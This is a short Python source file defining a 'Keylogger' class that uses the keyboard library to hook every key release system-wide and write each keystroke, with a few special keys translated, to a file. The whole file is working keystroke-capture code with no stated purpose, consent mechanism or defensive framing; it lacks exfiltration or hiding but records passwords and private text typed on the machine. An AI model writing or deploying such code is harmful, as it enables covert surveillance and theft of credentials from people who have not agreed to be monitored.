import keyboard


button_translation = {
    "space": " ",
    "enter": "\n",
    "tab": "[TAB]",
    "backspace": "[<--]",
}


class Keylogger:
    def __init__(self, filename: str):
        self.__file = open(filename, "w")

    def __del__(self):
        self.__file.close()

    @staticmethod
    def __parse_button(button: str):
        if button in button_translation:
            return button_translation[button]
        else:
            return button

    def __callback(self, event):
        button = Keylogger.__parse_button(event.name)
        self.__file.write(button)
        self.__file.flush()

    def start_log(self):
        keyboard.on_release(self.__callback)
        keyboard.wait()
